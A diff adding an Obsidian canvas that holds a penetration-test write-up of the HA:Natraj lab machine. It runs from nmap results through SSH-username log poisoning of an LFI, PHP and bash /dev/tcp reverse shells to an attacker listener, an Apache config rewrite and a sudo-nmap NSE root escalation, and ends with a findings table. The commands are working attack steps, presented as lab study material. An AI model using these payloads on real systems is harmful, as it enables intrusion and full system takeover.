@@ -1,0 +1,40 @@
+{
+	"nodes":[
+		{"id":"14a91e3b3b738f8d","type":"group","x":300,"y":-400,"width":290,"height":185,"label":"TCP - open"},
+		{"id":"d1346a32f3c301d4","type":"text","text":"# TARGET","x":-126,"y":-335,"width":250,"height":60},
+		{"id":"2845b36393773e44","type":"text","text":"#### nmap\n```\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   2048 d9:9f:da:f4:2e:67:01:92:d5:da:7f:70:d0:06:b3:92 (RSA)\n|   256 bc:ea:f1:3b:fa:7c:05:0c:92:95:92:e9:e7:d2:07:71 (ECDSA)\n|_  256 f0:24:5b:7a:3b:d6:b7:94:c4:4b:fe:57:21:f8:00:61 (ED25519)\n80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))\n| http-methods: \n|_  Supported Methods: GET POST OPTIONS HEAD\n|_http-server-header: Apache/2.4.29 (Ubuntu)\n|_http-title: HA:Natraj\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n```","x":-700,"y":-140,"width":778,"height":405},
+		{"id":"ba80425dd647227e","type":"text","text":"port 80","x":320,"y":-295,"width":250,"height":50},
+		{"id":"6290a7fef24610dd","type":"text","text":"port  22","x":320,"y":-370,"width":250,"height":50},
+		{"id":"2a341e9610c7d25d","type":"file","file":"Offsec  Play-Ground/media/Pasted image 20260802025202.png","x":1340,"y":640,"width":400,"height":146},
+		{"id":"796ec86525094d73","type":"file","file":"Offsec  Play-Ground/media/Pasted image 20260802031142.png","x":1340,"y":837,"width":400,"height":158},
+		{"id":"e9364cb3025cdef1","type":"text","text":"## Exploitation\n\n### Auth Log Poisoning\n\nWe found that we are able to include **/var/log/auth.log** in the LFI at [http://192.168.120.170/console/file.php?file=/var/log/auth.log](http://192.168.120.170/console/file.php?file=/var/log/auth.log). Thus, that file is ripe for poisoning. We will introduce some PHP code into an SSH session as follows:\n\n```\nkali@kali:~# ssh '<?php system($_GET['cmd']); ?>'@192.168.120.170\n<?php system($_GET[cmd]); ?>@192.168.120.170's password: \nPermission denied, please try again.\n^C\n```\n\n### Reverse Shell\n\nStart a netcat listener on port 4444. We will use a simple PHP reverse shell:\n\n```\nphp -r '$sock=fsockopen(\"192.168.118.3\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'\n```\n\nThe payload needs to be URL-encoded:\n\n```\nphp%20-r%20%27%24sock%3Dfsockopen%28%22192.168.118.3%22%2C4444%29%3Bexec%28%22%2Fbin%2Fsh%20-i%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27\n```\n\nWith the netcat listener running, we can trigger the reverse shell by navigating to the following URL:\n\n```\nhttp://192.168.120.170/console/file.php?file=/var/log/auth.log&cmd=php%20-r%20%27%24sock%3Dfsockopen%28%22192.168.118.3%22%2C4444%29%3Bexec%28%22%2Fbin%2Fsh%20-i%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27\n```\n\n```\nkali@kali:~# nc -lvp 4444\nlistening on [any] 4444 ...\n192.168.120.170: inverse host lookup failed: Unknown host\nconnect to [192.168.118.3] from (UNKNOWN) [192.168.120.170] 48876\n/bin/sh: 0: can't access tty; job control turned off\n$ python3 -c 'import pty; pty.spawn(\"/bin/bash\")'\nwww-data@ubuntu:/var/www/html/console$\n```","x":2080,"y":240,"width":644,"height":1131,"color":"#e45e5e"},
+		{"id":"d6e15e8152197028","type":"file","file":"Offsec  Play-Ground/media/Pasted image 20260802031219.png","x":1340,"y":1120,"width":400,"height":154},
+		{"id":"44c092981035d075","type":"file","file":"Offsec  Play-Ground/media/Pasted image 20260802031240.png","x":1340,"y":1400,"width":400,"height":205},
+		{"id":"c2d3b9dd4bd0018f","type":"text","text":"```\ncat /etc/apache2/apache2.conf \\\n  | sed 's/User ${APACHE_RUN_USER}/User mahakal/' \\\n  | sed 's/Group ${APACHE_RUN_GROUP}/Group mahakal/' \\\n  > /tmp/apache2.conf.tmp \\\n  && cat /tmp/apache2.conf.tmp > /etc/apache2/apache2.conf\n```","x":580,"y":1107,"width":636,"height":180},
+		{"id":"470b958a19fcafeb","type":"text","text":"```\ncurl -s \"http://192.168.201.80/console/file.php?file=/var/log/auth.log&cmd=bash+-c+'bash+-i+>%26+/dev/tcp/192.168.45.248/4444+0>%261'\"\n```","x":620,"y":860,"width":536,"height":135},
+		{"id":"2a6a22b1bf3f50a2","type":"file","file":"Offsec  Play-Ground/media/Pasted image 20260802031414.png","x":1161,"y":1700,"width":758,"height":300},
+		{"id":"26060283b6afe823","type":"text","text":"##### Write a minimal NSE script that spawns a shell:\n```\necho \"os.execute('/bin/bash')\" > /tmp/root.nse\n```\n##### Execute it:\n\n```\nsudo /usr/bin/nmap --script=/tmp/root.nse\n```\n###### **Output:**\n\n```\nid  \nuid=0(root) gid=0(root) groups=0(root)\n```","x":2200,"y":1646,"width":684,"height":408},
+		{"id":"1f3174f9eee830b0","type":"text","text":"```\n#   Vulnerability                                   Severity   Impact  \n--  ----------------------------------------------  ---------  -----------------------------------------------  \n1   Local File Inclusion in file.php                Critical   Arbitrary file read; escalates to RCE via log poison  \n2   auth.log poisonable via SSH username injection  High       PHP payload planted and executed via LFI include  \n3   Apache directory listing on /console/           Medium     file.php discoverable without authentication  \n4   www-data granted sudo on systemctl apache2      High       Service restart leveraged for lateral movement  \n5   apache2.conf writable by www-data               Critical   Apache user changed to mahakal; new shell spawned  \n6   sudo NOPASSWD: nmap for mahakal                 Critical   Local privilege escalation to root via NSE script\n```","x":1004,"y":2240,"width":1073,"height":260},
+		{"id":"2e846ddc6ce08da8","type":"file","file":"Offsec  Play-Ground/media/Pasted image 20260802030736.png","x":840,"y":-364,"width":400,"height":239},
+		{"id":"60a07ef93b5214fa","type":"file","file":"Offsec  Play-Ground/media/Pasted image 20260802025119.png","x":840,"y":400,"width":400,"height":225},
+		{"id":"7bb8bc56ad8e0308","type":"file","file":"Offsec  Play-Ground/media/Pasted image 20260802025106.png","x":840,"y":67,"width":400,"height":198}
+	],
+	"edges":[
+		{"id":"a3a2ab6c62aab274","fromNode":"d1346a32f3c301d4","fromSide":"right","toNode":"14a91e3b3b738f8d","toSide":"left"},
+		{"id":"eae39a28e77361c2","fromNode":"d1346a32f3c301d4","fromSide":"bottom","toNode":"2845b36393773e44","toSide":"top"},
+		{"id":"033c9ca1d74c4b8f","fromNode":"7bb8bc56ad8e0308","fromSide":"bottom","toNode":"60a07ef93b5214fa","toSide":"top"},
+		{"id":"030f54faf4e555d5","fromNode":"60a07ef93b5214fa","fromSide":"right","toNode":"2a341e9610c7d25d","toSide":"top"},
+		{"id":"6d22b950858303fe","fromNode":"ba80425dd647227e","fromSide":"right","toNode":"2e846ddc6ce08da8","toSide":"left"},
+		{"id":"9b1a9527b65b59be","fromNode":"2e846ddc6ce08da8","fromSide":"bottom","toNode":"7bb8bc56ad8e0308","toSide":"top"},
+		{"id":"cc225939e9267f42","fromNode":"2a341e9610c7d25d","fromSide":"bottom","toNode":"796ec86525094d73","toSide":"top"},
+		{"id":"eb2854372943d571","fromNode":"796ec86525094d73","fromSide":"right","toNode":"e9364cb3025cdef1","toSide":"left"},
+		{"id":"47ed46fa88bc0360","fromNode":"2a341e9610c7d25d","fromSide":"right","toNode":"e9364cb3025cdef1","toSide":"left"},
+		{"id":"5bfd7a648871a418","fromNode":"796ec86525094d73","fromSide":"bottom","toNode":"d6e15e8152197028","toSide":"top"},
+		{"id":"cecf69e8376eb8c8","fromNode":"d6e15e8152197028","fromSide":"bottom","toNode":"44c092981035d075","toSide":"top"},
+		{"id":"eb2b59189cd2bad1","fromNode":"d6e15e8152197028","fromSide":"left","toNode":"c2d3b9dd4bd0018f","toSide":"right"},
+		{"id":"13c37fdb8d1680c1","fromNode":"796ec86525094d73","fromSide":"left","toNode":"470b958a19fcafeb","toSide":"right"},
+		{"id":"b8a4b0fe87f75ee5","fromNode":"44c092981035d075","fromSide":"bottom","toNode":"2a6a22b1bf3f50a2","toSide":"top"},
+		{"id":"415777e47d02b134","fromNode":"26060283b6afe823","fromSide":"left","toNode":"2a6a22b1bf3f50a2","toSide":"right"},
+		{"id":"cea15f86e7d27f1b","fromNode":"2a6a22b1bf3f50a2","fromSide":"bottom","toNode":"1f3174f9eee830b0","toSide":"top"}
+	]
+}
